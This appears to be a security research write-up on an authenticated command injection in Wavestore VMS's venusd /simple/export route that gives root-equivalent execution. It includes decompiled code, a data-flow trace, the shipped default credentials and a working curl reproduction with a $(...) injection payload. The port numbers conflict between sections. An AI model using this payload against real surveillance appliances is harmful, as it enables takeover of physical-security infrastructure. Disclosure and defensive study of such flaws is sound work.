# Wavestore VMS — venusd /simple/export Command Injection to Root RCE

## 1. Product & Attack Surface

Wavestore VMS 6.48.809 (Wavestore Ltd, UK — CII physical security: video management system) runs the `venusd` daemon (3.7MB stripped ELF, self-developed HTTP/HTTPS/RTSP/ONVIF/WaveView all-in-one service). Linux x86_64 ISO appliance (AlmaLinux 10 base).

Ports:
- HTTP 80 (`HttpConnThread::processCmd` @0x004b0f70)
- HTTPS 443 (`HttpsConnThread::processCmd` @0x00529870, actually plaintext HTTP without TLS cert)
- RTSP 554
- WaveView 8601 (proprietary binary protocol)

Authentication: HTTP Basic + Digest (`passwordValid` → `Security::validateUser` @0x0059be10). Shipped default credentials (`venusd.conf` generated on first start):

```
[User_1] Name=admin   Passwd=admin   Level=admin:admin
[User_2] Name=install Passwd=a       Level=install:install
```

`install:a` is a runtime user (not an install-wizard temp user; venusd has no separate install wizard), part of the default post-install configuration.

**venusd process privileges (critical)**:
- `ps` shows user `dvr` (uid=2001)
- `/proc/<pid>/status`: `Uid: 0 2001 2001 2001` (real uid=0=root, effective/saved/fs=2001=dvr)
- `CapEff: 000001ffffffffff` (FULL capabilities)
- venusd starts as root, then `seteuid(dvr)` but retains real UID 0 + full capabilities
- Command injection via `popen` → `sh` inherits real UID 0 + full caps → root-equivalent execution

## 2. Root Cause: Unsanitized Command Injection in /simple/export

Reverse engineering (Ghidra headless 12.1.2): the command execution sink chain is

```
processGetSimple @0x004b1fc0 / @0x00528ee0   (HTTP /simple/* route handler)
  └─ simpleExportArgs @0x00528b20            (URL query %XX decode, no shell metachar sanitization)
       └─ strsystemf @0x0046f6e0             (vsnprintf + popen(cmd,"r") = sh -c)
            └─ /usr/share/venusd/vexport.sh  (wsexporttool --verbose $@  unquoted $@)
```

**strsystemf @0x0046f6e0** (core):
```c
int strsystemf(char *fmt, ...) {
    char cmd[0x400];
    va_start(ap, fmt);
    vsnprintf(cmd, 0x400, fmt, ap);   // user input concatenated into command string
    va_end(ap);
    FILE *p = popen(cmd, "r");        // sh -c cmd  ← command execution
}
```

**simpleExportArgs @0x00528b20** (core):
```c
void simpleExportArgs(HttpConnThread *this, char *query) {
    char user[0x100];
    urlDecode(query, user);           // %XX URL decode, no sanitise() call
    strsystemf("/usr/share/venusd/vexport.sh %s %s", user, ...);  // raw to strsystemf
}
```

**Contrast with sanitise() @0x00609000** (venusd's generic sanitizer, strips `; | & \ $ ~ ! > \n`):

```c
// sanitise() @0x00609000 — the generic sanitizer used by other routes
// strips shell metacharacters: ; | & \ $ ~ ! > \n
```

The `processGetSimple` path does NOT call sanitise() — the raw URL-decoded value goes straight to `strsystemf`. Other paths (e.g., `settimezone`) call sanitise() and are not injectable. This makes `/simple/export` the only unsanitized command-injection point in the HTTP surface.

**8443 vs 8080 dispatch difference**:

- 8443 (`HttpsConnThread::processCmd` @0x00529870): `/simple/export` calls `simpleExportArgs` (unsanitized) → injectable
- 8080 (`HttpConnThread::processCmd` @0x004b0f70): the same path returns 404; `simpleExportArgs` on this path is a different/guarded implementation → not injectable
- Dynamic verification confirmed: same payload, 8443 → HTTP 400 + marker created; 8080 → HTTP 404 + no marker

## 3. Source

`GET /simple/export?user=<SOURCE> HTTP/1.1` with `Authorization: Basic aW5zdGFsbDph` (install:a).

- `user` parameter decoded via `%XX` URL decode into the command string
- `%24` decodes to `$`; `(` `)` need no encoding; `>` encoded as `%3E`
- Decoded `$(` `)` `>` shell metacharacters all reach `strsystemf` → `popen(sh -c)`

**Key difference (8443 vs 8080)**:
- 8443 port (`HttpsConnThread::processCmd` @0x00529870): `/simple/export` route calls `simpleExportArgs` unsanitized → injection works
- 8080 port (`HttpConnThread::processCmd` @0x004b0f70): same path returns 404; injection does not trigger (different/guarded simpleExportArgs implementation)
- Dynamic verification confirmed: same payload, 8443 → HTTP 400 + marker created; 8080 → HTTP 404 + no marker

## 4. Data Flow

```
Attacker HTTP GET /simple/export?user=install%24(id>/tmp/marker)
  │  %24 decodes to $; ( ) > preserved
  ▼
HttpsConnThread::processCmd @0x00529870  (port 443/8443 dispatch)
  │  path[0]=='s' → processGetSimple
  ▼
processGetSimple @0x00528ee0
  │  passwordValid(install:a) → passes (Basic auth header)
  │  calls simpleExportArgs(query="user=install$(id>/tmp/marker)")
  ▼
simpleExportArgs @0x00528b20
  │  urlDecode → user = "install$(id>/tmp/marker)"
  │  no sanitise()
  │  strsystemf("/usr/share/venusd/vexport.sh %s ...", user, ...)
  ▼
strsystemf @0x0046f6e0
  │  vsnprintf → cmd = "/usr/share/venusd/vexport.sh install$(id>/tmp/marker) ..."
  │  popen(cmd, "r")  →  sh -c "..."
  ▼
sh parses: $(id>/tmp/marker) command substitution
  │  id > /tmp/marker  (executed with real uid=0 + full caps)
  ▼
root-equivalent RCE
```

## 5. Exploitation Details

- Requires valid credentials (including shipped default `install:a`)
- Payload: `user=install%24(id>/tmp/marker)` → `$` decoded, `(` `)` `>` preserved
- The command substitution executes as root-equivalent (real UID 0 + full capabilities)

## 6. Dynamic Verification

### 6.1 Environment

- Deployment: Docker AlmaLinux 10 + venusd 6.48.809, `--privileged` (SUID + file caps)
- venusd process: `ps` shows user `dvr` (uid=2001); `/proc/<pid>/status` shows `Uid: 0 2001 2001 2001` (real uid=0) and `CapEff: 000001ffffffffff` (FULL capabilities)

### 6.2 Request

```
GET /simple/export?user=install%24(id>/tmp/marker) HTTP/1.1
Authorization: Basic aW5zdGFsbDph     (install:a)
Host: <TARGET_IP>:8443
```

`%24` URL-decodes to `$`; `(`, `)`, `>` are preserved. The decoded value `install$(id>/tmp/marker)` reaches `strsystemf` unsanitized.

### 6.3 Result

- HTTP 400 response (the export itself fails because `wsexporttool` does not recognize the injected argument), but the command substitution `$(id>/tmp/marker)` executes first
- Marker file `/tmp/marker` created with root privileges (real UID 0 + full capabilities)
- Same payload on port 8080: HTTP 404, no marker — confirming the 8443/8080 dispatch difference

→ authenticated root RCE confirmed.

### 6.4 Reproduction

```bash
# HTTP Basic auth: install:a (base64: aW5zdGFsbDph)
curl -k -u install:a "https://<TARGET_IP>:8443/simple/export?user=install%24(id>/tmp/marker)"
# verify: cat /tmp/marker  (created as root)
```

## 7. Impact & Fix Recommendations

**Impact**: Authenticated root RCE on the VMS appliance (real UID 0 + full capabilities) → full compromise of video surveillance infrastructure.

**Fix recommendations**:
1. Apply sanitise() to the `user=` parameter in the /simple/export path
2. Run venusd without retaining real UID 0 and full capabilities after privilege drop
3. Change shipped default credentials (admin:admin, install:a)
4. Restrict management ports to trusted networks; use TLS

## 8. Timeline & Disclosure Status

- Research completed and dynamically verified: 2026-08
- Vendor notification, CVE, and public disclosure channels: pending operator approval (Batch #6)
